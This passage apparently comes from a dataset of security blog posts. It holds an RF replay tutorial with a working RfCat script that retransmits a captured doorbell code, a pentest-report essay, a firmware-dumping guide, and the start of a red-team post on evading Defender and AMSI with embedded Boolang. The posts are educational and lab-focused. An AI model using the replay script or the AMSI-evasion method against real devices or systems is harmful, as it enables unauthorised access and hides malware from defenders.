BHIS blog \"Introduction to Software Defined Radio and GSM/LTE\")\n\nThe HackRF One - RF Signal replays using simple command lines:\n\nUndoubtedly, one of the quickest ways to replay an RF signal when the signal center frequency is known is using the HackRF tool \"hackrf_transfer\".\n\nBy providing the required parameters, the HackRF can capture the desired transmission (while pressing the peripherals remote button), and then save the raw data to a file. Additionally, the HackRF can replay (transmit) the raw RF signal in the saved file and thereby invoke the desired peripheral activity without the use of the physical remote.\n\nUnfortunately, although this method is quick and efficient, it is done 'blindly' in that little information is known about the signal. It does what it is intended to do, but falls short with regard to exposing possible attack vectors or vulnerabilities.\n\nThe HackRF One - RF Signal replays using GNURADIO flowgraphs:\n\nAlthough, not the quickest method of RF signal replays, the HackRF can also be used in conjunction with GNURADIO flow-graphs to capture, save, and replay RF signals. The learning curve to understanding GNURADIO can be quite extensive, however with this complexity comes great power and versatility.\n\nThe following screenshots show a previous signal replay project (vehicle FOB replay) that I conducted using GNURADIO flow-graphs (for more detailed information see my BHIS blog \"GNU RADIO PRIMER\"). As can be seen, the center frequency in this project was 315MHz but the process is the same.\n\nThe following shows a File Sink block which saves the captured signal.\n\nThe following shows the replay flow-graph (greyed out blocks are disabled).\n\nThe Yardstick One - RF Signal replays using RfCat:\n\nInstall RFCat and Dependencies (libusb, pyusb)\n\ngit clone https://github.com/atlas0fd00m/rfcat.git\ncd rfcat/\nsudo python setup.py install\ncd ../\ngit clone https://github.com/walac/pyusb.git\ncd pyusb/\nsudo python setup.py install\neasy install pip\npip install libusb\n\nPlug in your device and run the following to verify:\n\n rfcat -r \n\nVerify the installation and dongle detection:\n\nLoading the saved .wav file (which we captured using GQRX) into Audacity, we can quickly identify the transmitted on-off keyed data burst.\n\nHighlighting the transmitted data burst and zooming in, we can see a repeating pattern of smaller bursts.\n\nZooming in on any of the repeating smaller bursts allows us to identify the actual OOK (on-off keying) PWM (pulse width modulated) data. Short pulses are considered (Mark = 1) and wider pulses are considered (Space = 0).\n\nDecoding the waveform pulses, we get the following digital footprint:\n\nBinary bit-stream:\n\nIn order to reproduce the waveform for replay on the Yardstick, each value of the digital footprint pulses need to be encoded using the following bit table:\n\nFootprint value = 0    Encoded bits = 1110\n\nFootprint value = 1    Encoded bits = 1000\n\nEncoded bit-stream:\n\n11101000 11101000 11101110 10001110 11101110 10001000 10001110 10001110 10001110 11101000 11101000 10001000 10000000\n\nIn order to replay this bit-stream using the Yardstick One, we need to convert this binary data into hex.\n\nThis results in the following hex values: E8 E8 EE 8E EE 88 8E 8E 8E E8 E8 88 80\n\nWe then need to precede each hex value with '\\x'.\n\nYardstick Replay String = \\xE8\\xE8\\xEE\\x8E\\xEE\\x88\\x8E\\x8E\\x8E\\xE8\\xE8\\x88\\x80\n\n(padded with zeros) = \\xE8\\xE8\\xEE\\x8E\\xEE\\x88\\x8E\\x8E\\x8E\\xE8\\xE8\\x88\\x80\\x00\\x00\\x00\\x00\\x00\\x00\n\nWith the Yardstick One installed we can now run a RfCat instance: $ sudo python doorbell.py\n\n(my script doorbell.py)\n\nNote: Baud rate is approximated using the equation: baud rate = reciprocal (1/t) where time is the period of 1 bit\n\nBased on the following screenshot, we can see a 3-bit pulse is approximately 630 microseconds in length, dividing by 3 yields a time of 210 microseconds per bit. Using the time of the shortest pulse (210uS) and taking it's reciprocal gives us the approximate baud rate of 4800.\n\nExecuting the doorbell.py script, successfully resulted in ringing the doorbell!\n\nAdditional Information:\n\nRFCat as a Spectrum Analyzer:\n\nInstall Spectrum Analyzer prerequisites:\n\nsudo pip install PySide2 \nsudo apt-get install ipython \n\nExecuting >d.specan(433920000) and pressing remote button\n\nFinal Notes: \n\nIn an effort to automate the entire replay process (rather than manually entering the hex string in interactive mode), I wrote a short python script to reproduce the digital footprint that was captured by GQRX and which was later analyzed in Audacity.\n\nAs was mentioned earlier, encoding of the digital footprint was based solely on the following bit table:\n\nFootprint value = 0    Encoded bits = 1110\n\nFootprint value = 1    Encoded bits = 1000\n\nHowever, it needs to be mentioned that although I was able to successfully ring the bell, my colleague was unsuccessful running the same script on his hardware. The difference between my captured digital footprint and his is displayed below:\n\nNotice that my footprint begins with a \"Space\" (encoded 1110). However BB King's footprint begins with a \"Mark\", and by looking at the pulse, it should have been encoded as 0001. Unfortunately, I did not account for that scenario, and my script, therefore, encoded it as 1000 resulting in a fail for BB King's testing.\n\nTo correct for this scenario, I made a modification to the script that checks the first pulse of the digital footprint and encodes the entire footprint according to the following bit-table:\n\nFirst pulse of footprint = Space ('0')\n\nFootprint value = 0    Encoded bits = 1110\n\nFootprint value = 1    Encoded bits = 1000\n\nFirst pulse of footprint = Mark ('1')\n\nFootprint value = 0    Encoded bits = 0111\n\nFootprint value = 1    Encoded bits = 0001\n\nPython code: \n\nUnderstand that I make no claims on the elegance of my python coding and admittedly threw this together rather quickly at the expense of efficiency and technique. Also, as there is presently no support for the rflib module in python3, so I opted to code it in python 2.7\n\nInasmuch, you are welcome to use and edit the code to your liking, however, keep in mind that you are also responsible for not breaking any laws by illegally transmitting on regulated frequencies.\n\nimport sys\nimport time\nfrom rflib import *\nfrom struct import *\n\n# User defined parameters \n_digital_footprint = \"0101001000111010100101111\" # My footprint: (short transition from 'space to mark')\n#_digital_footprint = \"11000111010000\" # BB King's footprint: (long transition from 'space to mark')\n_frequency = 433890000\n_baudrate = 4800\n_modulation = \"MOD_ASK_OOK\" # Modulation Type (not alterable in this version)\n_mult = 3 # Number of times to transmit RF signal\n_pad_bytes = 3 # Number of zero bytes for trailing padding\n_method = \"1\" # Time period of 'valley' gap when transitioning from space to mark in footprint:\n # Short period (1 bit time period) : _method = \"0\"\n # Long period (3 bit time period)  : _method = \"1\"\n\n# Configure rf_cat \nd = RfCat()\n\nd.setFreq(_frequency)\nd.setMdmModulation(MOD_ASK_OOK)\nd.setMdmDRate(_baudrate)\n\nprint \"SIGNAL INFORMATION\"\nprint \"------------------\"\nprint \"Frequency:                 \", _frequency\nprint \"Baud rate:                 \", _baudrate\nprint \"ModulationType:            \", _modulation\nprint \"Repeat transmission count: \", _mult\nprint \"Digital footprint:         \", _digital_footprint\n\nmark_space = str(_digital_footprint)\nxmt_stream = \"\"\n\n# Scan each digital footprint bit (pulse) and convert it to the appropriate 4-bit value\n# Mark = 1 (short pulse) and Space = 0 (long pulse)\nmark_space = str(_digital_footprint)\nxmt_stream = \"\"\n\nif (_method == \"0\"): # transitions from space to mark (in footprint) are short (1 bit time period)\n for i in mark_space:\n\n if (i == \"0\"): # Space\n _pulse = \"1110\"\n\n if (i == \"1\"): # Mark\n _pulse = \"1000\"\n\n xmt_stream = xmt_stream + _pulse\n\nif (_method == \"1\"): # transitions from space to mark (in footprint) are long (3 bit time period)\n for i in mark_space:\n\n if (i == \"0\"): # Space\n _pulse = \"0111\"\n\n if (i == \"1\"): # Mark\n _pulse = \"0001\"\n\n xmt_stream = xmt_stream + _pulse\n\n# If length of digital footprint is odd, then pad it with \"0000\" to make it 8 bits\nif (len(_digital_footprint) % 2 != 0):\n xmt_stream = xmt_stream + \"0000\"\n\n# Pad zeroes for gap length between transmissions\n_padding = \"\"\nfor i in range(0, _pad_bytes):\n xmt_stream = xmt_stream + \"00000000\"\n _padding = _padding + \"00000000\"\nprint \"Trailing padding:          \", _padding\n \nprint \"RF transmit binary stream: \", xmt_stream\n\n# Convert binary transmit stream to hex equivalent'\nhex_xmt_stream = str(('%08X' % int(xmt_stream, 2)))\nprint \"RF transmit hex stream:    \", hex_xmt_stream\n\nmod_xmt_stream = \"\"\nfor i in xrange(0, len(hex_xmt_stream), 2):\n ch = \"\\\\x\"\n mod_xmt_stream = mod_xmt_stream + (ch + (hex_xmt_stream[i:i+2]))\nprint \"Modified RF hex stream:    \", mod_xmt_stream\n\n# -------------------Send Transmission ----------------------------------------#\nprint \"Starting transmission ...\"\n\nhex_data = bytearray.fromhex(hex_xmt_stream)\nd.RFxmit(hex_data, repeat = _mult)\n\nd.setModeIDLE()\nprint \" \"\nprint \"Transmission Complete\"\n\nFollow-up testing:\n\nIn my attempt to try and understand why I needed to have two separate bit tables when encoding for two different pieces of hardware (just because one footprint started with a space and one started with mark), I decided to look into it further. I ran a test using my known working digital footprint, but with BB King's encoding on the assumption that maybe it would work and I could eliminate the need for two bit-tables. It did not work, so I did a deep dive into why not. After careful attention to detail, it became clear where the problem was. The issue was not that my footprint started with a space and his with a mark, the difference was in the period of time transitioning from a space to mark!\n\nCompare the two digital footprints (which I posted earlier):\n\nAnalyzing my footprint, the period of time when transitioning from space to mark is 1 bit in length, where BB King's space to mark transitioning period of time is 3 bits in length.\n\nBased on this knowledge, I again modified my python code to account for this difference when choosing which bit table to use. No longer concerned with whether a footprint begins with a space or mark, I instead looked at the transitioning period and used this information to choose the appropriate bit table. Success!!!\n\nClosing thoughts:\n\nWorking with the Yardstick for the first time proved to be a very rewarding experience for me, and having the opportunity to collaborate with BB King, while we simultaneously worked on our own unique hardware, was hugely beneficial to me. It kept me focused and on track, and highly motivated, as well as exposed me to variations that could occur in similar (yet different) test labs.\n\nAlso, in my humble opinion, I feel that Michael Ossmann's Yardstick One (Great Scott Gadgets) is an awesome tool, that's relatively inexpensive, easy to interact with, yet versatile enough to automate if the need arises. It's frequency limitations (under 1GHz) is of little concern when capturing and replaying rolling or fixed code devices like vehicle fobs, garage door openers, wireless doorbells, security devices, or just about any wireless RF signal in that frequency range.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"What You Should Actually Learn From a Pentest Report\"\nTaxonomies: \"Informational, InfoSec 101, dakota nelson, pentest reports, Pentesting\"\nCreation Date: \"Mon, 27 Jan 2020 15:13:05 +0000\"\nDakota Nelson //\n\nUnknown Unknowns: \n\nSo you\u2019ve been pentested. Congrats! It might not feel like it, but this will eventually leave you more confident about your security, not less. The real question is - why might it not feel like it? Pentest findings can be broken down many ways, of course - the obvious one being by severity - but I would like to propose another category: information value, or, a more straightforward term, surprise.\n\nWhen you first read your pentest report, there\u2019s a good chance there will be things on there you didn\u2019t expect - vulnerabilities or misconfigurations that you had no idea were such a problem, or even existed at all. This is surprising, and your brain doesn\u2019t always like surprise - but in this case, surprise is good. Surprise is the process of, as Rumsfeld would say, turning unknowns into knowns.\n\nThere are still different amounts of surprise, though, and the information value that I\u2019m proposing can also be looked at as which box in this Rumsfeld Matrix the finding lived in before you learned about it on the report.\n\nThe first option is that you already had some sense of these vulnerabilities. Say, for instance, that you had a box externally facing that you had never scanned, but suspected might be insecure. Finding vulnerabilities on this box might move the box from a \u201cknown unknown\u201d to a \u201cknown known.\u201d This is useful! But - it\u2019s still something that you likely could have done on your own, with a vulnerability scanner or the like, since you knew where to look. A known unknown is not usually very surprising when it becomes a known known.\n\nOn the other hand, there are the really surprising findings - the ones you didn\u2019t expect to crop up. This, I think, is where the real value of a pentest comes from. Getting a report back that says \u201call of your Windows XP boxes are unsupported\u201d is probably not terribly useful to you, because it\u2019s no surprise to learn that XP is unsupported (at least, I hope not) and there\u2019s likely some business reason those machines are still up. The report can be useful when briefing management to try to convince them to finally get rid of the XP machines, but that value is generally limited. On the other hand, a report that says \u201cwe were able to pivot using RDP to a box you didn\u2019t know existed, then elevate from there to domain administrator using mimikatz\u201d might be a genuine shock - and therefore, extremely valuable!\n\nThis isn\u2019t to say that only extremely complex findings live as unknown unknowns - this all depends on what the blue team knows going into the test. For some companies, finding out that your boxes are vulnerable because they\u2019re unpatched might be fairly surprising, while others might have their network so well locked down that only extremely advanced techniques come as a surprise to them. This is ok! Every company is in a different place, and wherever you start, as long as the test moves things into the known knowns box, it reduces your risk at the end of the day.\n\nWhen you\u2019re thinking about getting a test, or evaluating the results, spend a minute or two thinking about what you know that you don\u2019t know, and how to find out what you don\u2019t know you don\u2019t know with the help of the pentest. Giving your testers a narrow scope is well and good for avoiding surprise, but - even though it\u2019s unpleasant - maybe surprise isn\u2019t so bad after all.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Dumping Firmware With the CH341a Programmer\"\nTaxonomies: \"Hardware Hacking, How-To, Informational, AsProgrammer, Rick Wisser\"\nCreation Date: \"Wed, 29 Jan 2020 13:10:10 +0000\"\nRick Wisser //\n\nNote: This blog will also be a lab for any of the upcoming Wild West Hackin' Fest Conferences.\n\nDuring a recent engagement, I came across an issue. The issue I encountered was that the SPI chip I was trying to dump the firmware off of was a 1.8v chip. This would not have been a problem but both the shikra and bus pirate are rated for 3.3v chips. I considered creating a voltage divider to step the voltage down but after a little Googling, I came across the CH341a with the 1.8v adapter. I decided to order it with one-day shipping. After I worked with it and was able to successfully dump the firmware from the 1.8v IC without having to remove the SPI chip from the circuit board, I decided to write a blog about it. This blog is targeted for all audiences. It might be a little too step-by-step for intermediate or experienced people who have dumped firmware with other tools but I wanted to include the beginner as well because we all started somewhere right?\n\nBelow is a picture of the CH341a package that I got. I will include links at the end of this blog on which items I bought or reference.\n\n CH341a Package Contents \n\nThe CH341a is very easy to set-up. Usually, I use a Linux variant Operating System for conducting any testing. However, from previous experience, I know that the AsProgrammer works better on a Windows PC. All you need are the drivers and the AsProgrammer software which can be found in the following links.\n\n\u201cCH341-Windows-SPI-I2C-Driver+SDK-library\u201d and \u201cCH341-Windows-Serial-Driver+SDK-library\u201d directories at https://github.com/boseji/CH341-Store.\n\nAsProgrammer software - https://github.com/nofeletru/UsbAsp-flash/releases/\n\nAfter downloading the software and installing it on my Windows laptop, it was time to pick a target. I went into my collection of \u201cgarage sale\u201d electronics and found a Netgear WNDR3700 router that would do the trick. After cracking open the case and conducting reconnaissance on the chips for the device, I found a target SPI chip. The following is a picture of the board with the SPI chip identified.\n\n Netgear WNDR3700 Circuit Board with SPI Chip Identified \n\nAs with any reconnaissance, you will want to find more information. Therefore, I grabbed the datasheet for the MX25L6445E SPI chip and looked at the pin diagram and identified the type of package that is installed on the WNDR3700 circuit board.\n\n Datasheet Pin Configuration and Description\n\nExamining the datasheet, I noticed that this particular chip has a VCC of 3.3v and the actual package type on the board is a 16 pin chip. Due to this information, we know that it is not necessary to use the 1.8v adapter. But it appears that we might have an issue with the 16 pin chip package (note that the middle 8 pins are not used.) The CH341a only comes with an 8 pin chip clip and header. I could solder wires onto the functioning pins of the MX25L6445E and interface it to the CH341a Zero Insertion Force (ZIF) socket but since I could use a 16 pin chip clip for future engagements I decided to purchase one. \n\nAfter a quick internet search, I chose a 16 pin chip clip that included headers already soldered for interfacing with the ZIF socket of the CH341a. I will place the link for the 16 pin chip clip at the bottom of this blog along with a link for the CH341a programmer. The headers that were provided with the 16 pin chip clip included an 8 to 16 pin as well as a 16 to 16 pin header. I also ohmed out the 8 to 16 pin header and found that it had the correct traces in place to interface directly with the 16 pin MX25L6445E chip and the CH341a ZIF socket. Here is a picture of the chip clip with the headers.\n\n 16 Pin Chip Clip with Headers\n\nThe connections were easy to make since everything has either pin markings, silkscreen prints, or some type of indicator to reference pin 1. For instance, the chip is marked with a divot in the corner where pin 1 is. The chip clip has one of its strands of cable red to indicate pin 1 and the interface board has numbers silk-screened on the board to indicate the pins. Finally, the CH341a has silkscreen as well to indicate where pin one goes for either a 24xxx or 25xxx chip type. Below are images with descriptions showing the pin and silk marking indicators. \n\n Pin 1 Indicator for MX25L6445E Chip \n\n Silk Screen on CH341a for Pin / Chip Reference\n\nThe CH341a silkscreen has indicators for 25xx and 24xx with little half circles to the right of them. This half-circle indicates that pin 1 is next to the half-circle and would be the top right corner. The ZIF socket has 16 pins so it is divided in half with the right side for 24xx chips and the left side for 25xx chips. In this situation, we will be using the left side of the ZIF socket since our chip is an MX25L6445E chip. \n\n Pin 1 Designators on Header Board and Chip Clip Cable\n\nThe above image shows the chip clip cable attached to the header board with the pin 1 designators lined up. \n\nNext, we will hook the chip clip to the chip with the red pin 1 indicator aligned with the pin 1 designator of the MX25L6445E chip as shown below. \n\n Chip Clip Installed on MX25L6445E Chip\n\nFinally, we install the header with the chip clip cable onto the CH341a ZIF socket as shown below.\n\n Aligning Header Pins with CH341a ZIF Socket \n\nNow with everything connected, we can dump the firmware from our MX25L6445E chip. We connect the CH341a to the USB port on our Windows PC and open up AsProgrammer. First, we have to select the CH341a as the hardware device in the Hardware menu.\n\nIMPORTANT NOTE: The CH341a supplies the power to the board so you do not need to plug in the WNDR3700 into the wall. If you do so, you may damage your CH341a.\n\n Choosing Hardware Device in AsProgrammer\n\nThe next thing you need to do is select the type of SPI chip you will be using. Select IC from the main menu and then SPI followed by the vendor and then the IC. In this case, we want the MACRONIX MX25L6445E chip. \n\n Selecting the IC in AsProgrammer\n\nOnce the chip is selected it will be shown in the top menu screen of the AsProgrammer. The \u201cSize\u201d, \u201cPage\u201d, and \u201cSPI commands\u201d will also auto-populate so you should not have to mess with them. You also want to confirm that the SPI radio button is selected. Below is a screenshot of how AsProgrammer should be set-up.  \n\n AsProgrammer Configuration After Choosing IC. \n\nOnce everything looks good you will click the box with the green arrow coming out of it to read the contents of the chip. Once it is done, you can also save it with the floppy disc icon. \n\nThis particular chip took 1.5 minutes to read the contents which can be shown below in the screenshot below after reading the contents of the MX25L6445E Chip. \n\n Successful Read of MX25L6445E IC.\n\nNow that we have our firmware dumped we can evaluate it for anything of interest. In this case, I used the \u201cstrings\u201d or \u201cstrings.exe\u201d (You will have to download it for the Windows OS) to search for \u201cpassword\u201d and \u201cSSID\u201d as shown below.\n\n Using Strings to Search for \u201cpassword\u201d and \u201cSSID\u201d\n\nAs you observe you can see that this particular router looks to have been reset before it was taken out of commission and sold since it has what looks like default values. \n\nThe best thing about the CH341a is that with other hardware, such as the Bus Pirate and Shikra I have found that I need to remove the SPI chip from the board to interact with it due to other circuits interfering with the targeted SPI chip. However, with the CH341a, I can just place a chip clip on the chip and dump the firmware without worrying about damaging the component by desoldering and soldering it on a breakaway board.\n\nIf you enjoyed this blog post and would like to get your hands dirty, come and join us at one of our Wild West Hackin\u2019 Fest conferences. I will have this and many other labs available for attendees to play with.\n\nBelow are the links for the items that I purchased in the blog post.\n\nAmazon CH341a Pro with 1.8v add on: https://www.amazon.com/Organizer-EEPROM-CH341A-Adapter-Programmer/dp/B07V2M5MVH/ref=sr_1_1?keywords=ch341a&qid=1579295338&s=electronics&sr=1-1 \n\n Amazon link for the 16 pin chip clip: https://www.amazon.com/WINGONEER-SOIC16-circuit-programming-adapter/dp/B01CYA9BTY/ref=pd_sbs_147_20?_encoding=UTF8&pd_rd_i=B01CYA9BTY&pd_rd_r=bcbc95e8-fcd8-4012-a17a-5e15d8a7da7b&pd_rd_w=4xhD3&pd_rd_wg=BUd6J&pf_rd_p=670e3530-913b-43e2-8005-da937e9a4fe8&pf_rd_r=AE4216TVMK66NZAYCY34&psc=1&refRID=AE4216TVMK66NZAYCY34   \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Red Teamer's Cookbook: BYOI (Bring Your Own Interpreter)\"\nTaxonomies: \"How-To, Informational, Red Team, BYOI, Marcello Salvati, Red Team\"\nCreation Date: \"Mon, 03 Feb 2020 18:48:20 +0000\"\nMarcello Salvati //\n\nThis fairly lengthy blog post aims at providing Red Team Operators ideas on how to incorporate BYOI tradecraft into their own custom tooling and get those creative malware development juices flowing. This blog post can also serve as a \u201clight\u201d introduction to .NET and how to write basic C2, so there\u2019s hopefully going to be something here for everybody regardless of your skill level. We\u2019re going to start from scratch and develop a bare-bones PowerShell implant which will utilize the BYOI concept to bypass Defender & AMSI on the latest build of Windows 10. Along the way, I\u2019ll also be explaining some core concepts underpinning BYOI.\n\nThe talks, tools/code that I\u2019ve released (e.g. SILENTTRINITY and the proof-of-concept examples in the OffensiveDLR repository) were somewhat successful (I think) in bringing to the attention of the community some of the main benefits of the BYOI concept, but I definitely can do a better job in providing some examples of tradecraft that Operators can use in their day to day engagements and incorporate into their own tooling without having to use the stuff I\u2019ve published on Github.\n\nI\u2019ve also been shamelessly talking about BYOI payloads & tradecraft for the past year or so at various conferences. As my knowledge of .NET development & tradecraft grew and shifted over time I\u2019ve tried to keep updating the talk to reflect the new things that I\u2019ve learned and correct inaccuracies of previous versions of the talk. Because of this, especially if you\u2019re not familiar with the concept behind BYOI, I would highly recommend watching the talk I gave at BSides Puerto Rico 2019 as it\u2019s the most up-to-date version. At of the time of writing, however, it seems like the recordings for the con haven\u2019t been released yet (the slides for the talk are on Github here) so in absence of that one, I\u2019d recommend watching the one I gave at Derbycon 2019. While there are a few things that I now know are incorrect and definitely, others that I could have explained better, it\u2019ll suffice and get you caught up on the core concept (or you can just read the next sections of this blogpost):\n\nhttps://www.youtube.com/watch?v=o6m6_TncrcI\n\nBefore we dive straight into the code, let\u2019s take a minute to go over some key .NET and BYOI takeaways and talk about why I find this type of tradecraft to be useful and elegant from an offensive perspective.\n\n.NET Key Concepts\n\nReaders already familiar with .NET can probably skip this section, I thought I\u2019d add this for the sake of completeness.\n\nThere are a ton of articles on the intertubes (including the official Microsoft docs) that attempt to explain what .NET is. Personally, I find that most of them either aren\u2019t meant for people who have never developed in .NET before or they\u2019re so vague that the explanation becomes meaningless. This didn\u2019t make things simple for me when I first embarked on trying to write C#: coming from Python and having no formal programming background this truly was a whole new world.\n\nThe following is my humble attempt at explaining what .NET is:\n\n.NET is a language independent development platform comprised of a set of tools, infrastructure & libraries that enables you to create cross-platform applications.\n\n*mic drop* let the hate mail commence.\n\nI would like to point out one key thing about that sentence (especially in the context of this blog post): there is no mention about what programming language the platform actually uses.\n\nA lot of people tend to associate a specific programming language with .NET, the most common one being C#. However, C# is just the de-facto language for interacting with the platform and not the platform itself. Parts of the infrastructure and tooling that .NET provides allows you to write your own programming language to interact with it. This is an extremely important thing to understand: .NET is language independent, it\u2019s not tied to a specific programming language.\n\nThere are also various implementations (\u201cflavors\u201d if you will) of .NET, this is a common pain point for a lot of .NET newbies. The most common \u201cflavors\u201d are:\n\n.NET Framework\n\n.NET Core\n\nThe \u201c.NET Framework\u201d is the original implementation of .NET and has been around forever, this particular implementation is extremely specific to Windows and tightly integrated within the OS itself. An important thing to mention: when I talk about .NET throughout the rest of this blog post I\u2019m referring to this particular implementation unless I explicitly state otherwise. This is because we\u2019re going to be building implants specifically for Windows and using languages \u201ctargeting\u201d the .NET Framework.\n\n\u201c.NET Core\u201d is the newest implementation and the future of the .NET platform itself. The .NET Framework will be replaced by .NET Core in the near future. Unlike the .NET Framework, .NET Core is truly cross-platform, if you wanted to build cross-platform applications, you\u2019d \u201ctarget\u201d .NET Core.\n\nWe also need to talk about .NET Assemblies as they\u2019re a fundamental part of the development platform.  .NET Assemblies are a single unit of execution that all .NET languages can interpret and execute. By compiling any .NET language, you wind up with a .NET Assembly in the form of an executable or DLL. \n\nA few key points about .NET Assemblies:\n\nThe .NET Assembly format is different than .exe\u2019s or .dll\u2019s generated via un-managed languages. (e.g. C++, C)\n\nThey can be executed by any .NET language (including third-party languages).\n\nThey can be loaded reflectively by calling Assembly.Load()\n\nIn essence, .NET natively supports reflective PE/DLL injection by virtue of the Assembly.Load() function. We will be using this function a lot in the embedding process.\n\n.NET Framework version 4.8 brought AMSI scanning for .NET Assemblies. So now whenever you call the Assembly.Load() function that assembly will get passed to AMSI/Defender for inspection.\n\nBYOI Key Concepts\n\nThe Offsec tooling migration from PowerShell to C# brought about some operational disadvantages. The biggest one in my view being that now all your tools/payloads/implants need to be compiled.  This might not sound like a big deal, but in the long run, this can be a huge time sink and make things very cumbersome during a Red Team Operation.\n\nDon\u2019t get me wrong, C# compilation can be completely automated using CI/CD pipelines (see Dominic\u2019s amazing \u201cOffensive Development: How To DevOps Your Red Team\u201d talk) or using the Roslyn compiler (which is what Covenant uses in order to deal with all the necessary compilation) however these two approaches still require some pretty heavy overhead in terms of setup, boiler-plate code, and/or requirements. They\u2019re just not as flexible, simple, and straightforward as PowerShell tradecraft used to be or really any tradecraft using a scripting language.\n\nWhat I wanted was a way to shift the paradigm back to PowerShell style tradecraft: just host some source code server-side, throw it at a compromised endpoint, and dynamically evaluate/execute it preferably in memory (which is exactly what PowerShell Empire did) only without actually using PowerShell (because of all the protections in place) while still being able to access those sweet .NET Framework APIs. Seems like a tall order? Turns out, not really!\n\nPreviously we talked about how the .NET platform is language independent and provides infrastructure to build your own programming language in order to interact with it. Because of this, there are many .NET languages, some officially supported by Microsoft and others built by third parties. A subset of these are scripting languages and don\u2019t need to be compiled (at least on the surface). Additionally, one of the consequences of all of these languages being built on the same underlying platform is that they\u2019re all interoperable with each other, which also means they expose APIs/provide extremely easy ways of embedding or \u201chosting\u201d a language within another .NET language.\n\nThis is the main concept that underpins BYOI tradecraft: we can use third-party .NET scripting languages the same way we\u2019ve been using PowerShell all these years. All we have to do is \u201chost\u201d (embed) one in a .NET language which is present by default in Windows (such as C# or even PowerShell) and bam! We\u2019re back to the good ol\u2019 days of PowerShell style tradecraft.\n\nOne thing I\u2019d like to underline: this isn\u2019t by any means a novel concept, as a matter of fact, you\u2019ve probably used tools that do this without even knowing it: p0wnedshell, PowerLine, and NPS all \u201chost\u201d (embed) the PowerShell Runtime within a C# binary in order to execute PowerShell code without going through the main PowerShell executable. There are also tools that do the reverse and embed C# within PowerShell.\n\nWhat we\u2019re going to be doing is embedding third-party scripting languages (in this case Boolang) within PowerShell. Each one of these third-party languages comes with its own unique set of tradecraft and OPSEC advantages.\n\n.NET Scripting Languages\n\nWhen I first started researching this, the first .NET scripting language I tried was IronPython. I soon came to realize that from an offsec standpoint it wasn\u2019t the most practical for a number of reasons, first and foremost being that it didn\u2019t natively support PInvoke (the ability to call unmanaged Windows APIs from a .NET language): you had to use a module in its standard library implementation which breaks if you call it within an IronPython engine running in memory.\n\nThis led me down a *very* long Googling session to try and find a .NET scripting language that supported PInvoke natively and was able to use it within an in-memory engine/runtime/compiler.\n\nAfter a while, I stumbled across this wiki page in the Boo repository on Github. At this point, my first question was: \u201cWhat the hell is Boo?\u201d As it says on/in/etc:\n\n\u201cBoo is an object-oriented statically typed programming language for the .NET and Mono runtimes with a Python inspired syntax and a special focus on language and compiler extensibility.\u201d \u2013 (Source:  https://github.com/boo-lang/boo/wiki)\n\nI was later to find out from an attendee of my DefCon Demo Labs presentation that Boolang was initially created as a scripting language for the Unity gaming engine (The more you know\u2026)\n\nBoo is literally perfect from a weaponization standpoint, it supports PInvoke natively, exposes \u201chosting\u201d APIs to embed it in other languages, and compiles directly in memory.\n\nBefore I found Boo, I stumbled across a bunch of other languages. Here\u2019s a full list of the ones I thought were particularly interesting from a weaponization standpoint, (there are many others):\n\nBoolang\n\nClearScript\n\nSSharp\n\nDotnet-webassembly\n\nJint\n\nOut of all these ClearScript is also very interesting and worth mentioning as it\u2019s an official Microsoft project. It exposes a Jscript/VBscript implementation you can embed. Additionally, it allows you to expose the .NET CLR to Jscript/VBScript. Meaning you can call .NET APIs from ClearScript\u2019s Jscript/VBScript engine.\n\nFor an example of this, you can take a look at the Invoke-ClearScript.ps1 script from the OffensiveDLR repository: this script embeds the ClearScript Jscript Engine within a Posh script and then executes some Jscript code that also calls .NET APIs.\n\nBuilding a PoC BYOI PowerShell Implant\n\nWhile traditional PowerShell tradecraft is considered mostly dead because of AMSI and Script Logging, we can use BYOI to breathe some new life back into it. Additionally, using PowerShell as the \u201chost\u201d .NET language highlights some of the main benefits of BYOI tradecraft in terms of evasion and OpSec.\n\nLet\u2019s set the scene: you have some post-exploitation code you want to execute on an endpoint and you just want to use PowerShell \u2018cause you\u2019re very nostalgic. The endpoint is running the latest Windows 10 build and has Defender with AMSI and Script Block logging enabled. You set up a lab environment with the same defenses and controls in place in order to test your payload before actually executing it on the target endpoint.\n\nWe\u2019re going to use the AMSI Test Sample String to simulate \u201cmalicious code\u201d that we want to execute. This string is guaranteed to trigger Defender/AMSI, meaning, if this doesn\u2019t pop an alert we know we successfully bypassed them (thanks to @rastamouse for putting this on Github).\n\nhttps://gist.github.com/rasta-mouse/5cdf25b7d3daca5536773fdf998f2f08\n\nWe\u2019re going to execute our malicious code through a Boolang compiler embedded within our PowerShell script. First thing we do is grab the Invoke-Boolang.ps1 script from the OffensiveDLR repository. We\u2019re going to use this code as a template to build off of.\n\nhttps://gist.github.com/byt3bl33d3r/7a3068441dab6184b4d3df46d71998a2\n\nLet\u2019s break down what\u2019s going on here:\n\nLines 4, 8, 12, and 16 have 4 variables that contain the Compressed and Base64 encoded strings of Boo.Lang.dll, Boo.Lang.Compiler.dll, Boo.Lang.Parser.dll, and Boo.Lang.Extensions.dll respectively. These are the four main .NET Assemblies that the Boolang Compiler needs in order to spin up.\n\nLine 20-26 contains the Load-Assembly function which decompresses and decodes a given Base64 encoded and compressed Assembly and puts it into a byte array. We then call Assembly.Load() on the latter to reflectively load that Assembly into memory.\n\nLines 28-31 actually calls the Load-Assembly function and assigns the loaded Assemblies into their respective variables.\n\nLines 57-62 contain the actual Boolang Source Code we want to execute and assigns it to a variable. We\u2019re gonna replace this with our malicious code later on.\n\nOn line 64, we create a StringInput object and give it our Boolang Source code. This is just a way to tell the Boolang Compiler we want to compile source code from a string and not from a file on disk somewhere. We also give the source code a \u201cfake file name\u201d: this is important as the name we set here will be used in the generated Assemblies Type name which we\u2019ll need to reflectively call to actually execute our payload.\n\nOn line 67, we create a CompilerParameters object and pass false to the constructor which gets rid of a bunch of bugs that Boolang has when embedded into PowerShell. (See the comments in the script for details.)\n\nWhat follows on line 69-72 is the magic sauce, we add the ScriptInput object we defined earlier to the CompilerParamaters, we then specify we want the CompileToMemory pipeline. As you can imagine, this tells Boolang to compile the code completely in memory and not spool it to disk which is one of the main tradecraft benefits of BYOI. We also tell the compiler to allow Duck Typing which makes writing Boolang code a lot more similar to Python. \u263a\n\nOn lines 75-81, we manually tell the compiler to add mscorlib, System & System.Core as references to our Boolang code as we\u2019re going to need them to access basic .NET APIs. You obviously could add more references here if you wanted to access more .NET namespaces from within your Boo 